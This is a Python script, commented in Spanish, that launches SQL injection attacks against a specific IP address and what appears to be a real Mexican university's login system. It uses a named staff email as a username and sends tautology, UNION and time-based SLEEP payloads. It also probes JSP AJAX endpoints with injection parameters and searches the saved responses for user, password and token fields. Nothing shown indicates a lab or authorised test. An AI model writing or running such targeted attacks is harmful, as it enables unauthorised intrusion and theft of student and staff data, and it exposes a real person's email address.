import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TargetedExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def exploit_with_email_pattern(self):
        """Explota usando el patrón de email encontrado"""
        print("[*] Explotando con patrón de email hnieto@utslp.edu.mx...")
        
        # El email encontrado sugiere que hay usuarios reales en el sistema
        email_based_payloads = [
            # Intentar usar el email como usuario
            {"xUsuario": "hnieto@utslp.edu.mx", "xContrasena": "x"},
            {"xUsuario": "hnieto", "xContrasena": "x"},
            {"xUsuario": "hnieto' OR '1'='1'--", "xContrasena": "x"},
            
            # Buscar más usuarios del mismo dominio
            {"xUsuario": "admin@utslp.edu.mx' OR '1'='1'--", "xContrasena": "x"},
            {"xUsuario": "administrador@utslp.edu.mx' OR '1'='1'--", "xContrasena": "x"},
        ]
        
        for payload in email_based_payloads:
            try:
                form_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': payload['xUsuario'],
                    'xContrasena': payload['xContrasena']
                }
                
                response = self.session.post(self.base_url, data=form_data, timeout=10)
                
                # Buscar diferencias en la respuesta
                if "hnieto" in response.text:
                    print(f"[!] ¡Email hnieto encontrado en respuesta!")
                    
                if "utslp" in response.text.lower():
                    print(f"[!] Dominio utslp.edu.mx referenciado")
                    
                # Guardar respuestas interesantes
                if response.status_code == 200 and len(response.text) != 15957:  # Tamaño diferente al normal
                    filename = f"email_exploit_{payload['xUsuario'][:10]}.html"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    print(f"[+] Respuesta guardada en {filename}")
                    
            except Exception as e:
                print(f"[-] Error: {e}")

    def extract_data_using_time_based_techniques(self):
        """Usa técnicas basadas en tiempo para extraer datos"""
        print("\n[*] Usando técnicas basadas en tiempo...")
        
        import time
        
        # Probar si la inyección basada en tiempo funciona
        time_payloads = [
            "admin' AND SLEEP(5)--",
            "admin' UNION SELECT SLEEP(5),2,3--",
            "hnieto' AND SLEEP(5)--"
        ]
        
        for payload in time_payloads:
            try:
                start_time = time.time()
                
                form_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': payload,
                    'xContrasena': 'x'
                }
                
                response = self.session.post(self.base_url, data=form_data, timeout=10)
                elapsed_time = time.time() - start_time
                
                if elapsed_time > 4:
                    print(f"[!] ¡Inyección basada en tiempo funciona! ({elapsed_time:.2f}s) con: {payload}")
                else:
                    print(f"[-] No delay con: {payload}")
                    
            except requests.exceptions.Timeout:
                print(f"[!] Timeout - posible inyección con: {payload}")

    def exploit_ajax_endpoints(self):
        """Explota endpoints AJAX encontrados en los análisis"""
        print("\n[*] Explotando endpoints AJAX...")
        
        # Endpoints AJAX encontrados en los análisis
        ajax_endpoints = [
            "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp",
            "/jsp/escolar/muestra_bachillerato_ajax.jsp",
            "/jsp/ajax/muestra_bachillerato.jsp"
        ]
        
        parameters_to_test = [
            "?xCveBachillerato=1",
            "?xCveBachillerato=1' OR '1'='1'--",
            "?xCveBachillerato=1 UNION SELECT 1,2,3--"
        ]
        
        for endpoint in ajax_endpoints:
            for param in parameters_to_test:
                try:
                    url = f"{self.base_url}{endpoint}{param}"
                    response = self.session.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"[+] AJAX endpoint accesible: {endpoint}")
                        if "error" not in response.text.lower() and len(response.text) > 10:
                            print(f"    Respuesta: {response.text[:100]}...")
                            
                except Exception as e:
                    pass

    def search_hidden_parameters(self):
        """Busca parámetros ocultos en las respuestas"""
        print("\n[*] Buscando parámetros ocultos...")
        
        # Leer todas las respuestas guardadas
        import os
        html_files = [f for f in os.listdir('.') if f.endswith('.html')]
        
        hidden_params = set()
        
        for file in html_files:
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Buscar parámetros en JavaScript
                js_params = re.findall(r'var\s+(\w+)\s*=', content)
                hidden_params.update(js_params)
                
                # Buscar parámetros en formularios hidden
                hidden_inputs = re.findall(r'name="([^"]*y[A-Z][^"]*)"', content)
                hidden_params.update(hidden_inputs)
                
            except Exception as e:
                pass
        
        if hidden_params:
            print("[+] Parámetros ocultos encontrados:")
            for param in hidden_params:
                if any(keyword in param.lower() for keyword in ['user', 'pass', 'id', 'key', 'token']):
                    print(f"    *** {param}")
                else:
                    print(f"    - {param}")

# Ejecutar explotación dirigida
print("=== EXPLOTACIÓN DIRIGIDA ===")
targeted = TargetedExploiter("189.254.143.102")
targeted.exploit_with_email_pattern()
targeted.extract_data_using_time_based_techniques()
targeted.exploit_ajax_endpoints()
targeted.search_hidden_parameters()